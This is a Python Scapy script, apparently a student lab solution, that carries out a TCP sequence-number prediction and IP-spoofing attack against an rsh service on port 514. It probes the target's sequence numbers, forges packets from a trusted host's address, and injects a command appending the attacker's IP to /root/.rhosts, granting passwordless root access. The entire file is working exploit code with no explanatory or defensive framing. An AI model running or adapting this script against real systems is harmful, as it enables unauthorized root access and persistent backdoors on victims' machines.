from scapy.all import *

import sys

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    #TODO: figure out SYN sequence number pattern
    source_port = 9020
    packet = IP(src=my_ip, dst=target_ip)/TCP(sport=source_port, dport=514, flags="S")
    resp = sr1(packet, verbose=0, timeout=2)
    if (resp and resp[TCP]):
        respSeqNum = resp[TCP].seq
        time.sleep(1)
        resetPacket = IP(src=my_ip, dst=target_ip)/TCP(ack=respSeqNum+1, sport=source_port, dport=514, flags="AR")
        send(resetPacket, verbose=0)
        

    #TODO: TCP hijacking with predicted sequence number
    predictedSeq = respSeqNum
    predictedSeq = predictedSeq+128000
    trusted_host_port = 1012

    # Interval is usually 128000, but with a small chance it can be 64000. However, interval between rsh is 256000
    for _  in range(3):
        packetFromTrusted = IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=trusted_host_port, dport=514, flags="S", seq=0)
        send(packetFromTrusted, verbose=0)
        time.sleep(1)
        ackPacket = IP(src=trusted_host_ip, dst=target_ip)/TCP(ack=predictedSeq+1, sport=trusted_host_port, dport=514, flags="A", seq=1)
        send(ackPacket, verbose=0)
        time.sleep(1)
        rshPacket = IP(src=trusted_host_ip, dst=target_ip)/TCP(ack=predictedSeq+1, sport=trusted_host_port, dport=514, flags="PA", seq=1)/Raw(load="\x00")
        send(rshPacket, verbose=0)
        time.sleep(1)
        command = "root"+"\x00"+"root"+"\x00"+"echo \'" + my_ip +" root\' >> /root/.rhosts"+"\x00"
        addIpPacket = IP(src=trusted_host_ip, dst=target_ip)/TCP(ack=predictedSeq+1, sport=trusted_host_port, dport=514, flags="PA", seq=2)/Raw(load=command)
        send(addIpPacket, verbose=0)
        time.sleep(2)

        resetPacket = IP(src=trusted_host_ip, dst=target_ip) / TCP(ack=predictedSeq+1, sport=trusted_host_port, dport=514, flags="R", seq=52)
        send(resetPacket,verbose=0)
        predictedSeq = predictedSeq+256000-64000
        trusted_host_port -= 1